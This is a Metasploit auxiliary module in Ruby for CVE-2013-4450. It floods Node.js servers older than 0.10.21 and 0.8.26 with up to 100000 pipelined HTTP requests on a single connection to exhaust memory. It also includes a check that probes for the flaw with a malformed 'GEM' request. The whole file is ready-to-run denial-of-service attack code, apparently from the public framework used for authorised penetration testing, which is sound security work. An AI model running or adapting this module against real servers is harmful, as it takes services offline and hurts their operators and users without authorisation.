##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Node.js HTTP Pipelining Denial of Service',
        'Description' => %q{
          This module exploits a Denial of Service (DoS) condition in the HTTP parser of Node.js versions
          released before 0.10.21 and 0.8.26. The attack sends many pipelined
          HTTP requests on a single connection, which causes unbounded memory
          allocation when the client does not read the responses.
        },
        'Author' => [
          'Marek Majkowski', # Vulnerability discovery
          'titanous',        # Metasploit module
          'joev'             # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2013-4450' ],
          [ 'OSVDB', '98724' ],
          [ 'BID', '63229' ],
          [ 'URL', 'https://nodejs.org/ja/blog/vulnerability/http-server-pipeline-flood-dos/' ]
        ],
        'DisclosureDate' => '2013-10-18',
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(80),
        OptInt.new('RLIMIT', [true, 'Number of requests to send', 100000])
      ]
    )
  end

  def check
    # http://blog.nodejs.org/2013/08/21/node-v0-10-17-stable/
    # check if we are < 0.10.17 by seeing if a malformed HTTP request is accepted
    status = Exploit::CheckCode::Safe
    connect
    sock.put(http_request('GEM'))
    begin
      response = sock.get_once
      status = Exploit::CheckCode::Appears if response =~ /HTTP/
    rescue EOFError
      # checking against >= 0.10.17 raises EOFError because there is no
      # response to GEM requests
      vprint_error('Failed to determine the vulnerable state due to an EOFError (no response)')
      return Msf::Exploit::CheckCode::Unknown
    ensure
      disconnect
    end
    status
  end

  def host
    host = datastore['RHOST']
    host += ':' + datastore['RPORT'].to_s if datastore['RPORT'] != 80
    host
  end

  def http_request(method = 'GET')
    "#{method} / HTTP/1.1\r\nHost: #{host}\r\n\r\n"
  end

  def run
    payload = http_request
    begin
      print_status('Stressing the target memory...')
      connect
      datastore['RLIMIT'].times { sock.put(payload) }
      print_status("Attack finished. If you read it, it wasn't enough to trigger an Out Of Memory condition.")
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      print_status("Unable to connect to #{host}.")
    rescue ::Errno::ECONNRESET, ::Errno::EPIPE, ::Timeout::Error
      print_good("DoS successful. #{host} not responding. Out Of Memory condition probably reached")
    ensure
      disconnect
    end
  end
end
